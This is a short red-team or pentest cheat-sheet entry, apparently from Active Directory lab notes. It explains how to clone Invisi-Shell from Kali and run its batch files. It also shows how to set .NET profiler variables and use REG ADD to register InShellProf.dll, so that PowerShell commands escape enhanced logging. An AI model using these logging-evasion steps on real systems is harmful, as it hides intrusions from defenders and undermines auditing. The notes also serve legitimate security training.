# Invisi\_Shell

Start a PowerShell session using Invisi-Shell to avoid enhanced logging.

From Kali download Invisi-Shell

```bash
git clone https://github.com/OmerYa/Invisi-Shell.git
```

**then transfer folder to windows**

then run Invisi-Shell

```powershell
# for non admin privileges
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# with admin privilege
C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat

```

enable `.NET Profiler`

```powershell
set COR_ENABLE_PROFILING=1
set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
```

Add profile to registery

```powershell
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\AD\Tools\InviShell\InShellProf.dll" /f

# which this use to connect Profiler (InShellProf.dll) with PowerShell process.
# hat's meaning every command not saved in logs
```

run powershell

```powershell
powershell
```
